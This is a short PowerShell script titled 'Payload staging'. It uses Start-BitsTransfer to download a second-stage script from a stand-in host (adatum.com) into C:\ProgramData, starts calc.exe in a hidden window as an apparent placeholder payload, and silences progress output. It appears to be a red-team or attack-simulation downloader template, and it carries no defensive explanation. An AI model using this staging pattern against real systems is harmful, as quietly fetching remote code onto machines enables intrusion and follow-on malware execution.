
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://adatum.com:80/stage1.ps1",
    [string]$OutputPath = 'C:\ProgramData\stage1.bin',
    [int]$TimeoutSec = 237
)
Start-BitsTransfer -Source $TargetUrl -Destination $OutputPath
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
$ProgressPreference = "SilentlyContinue"
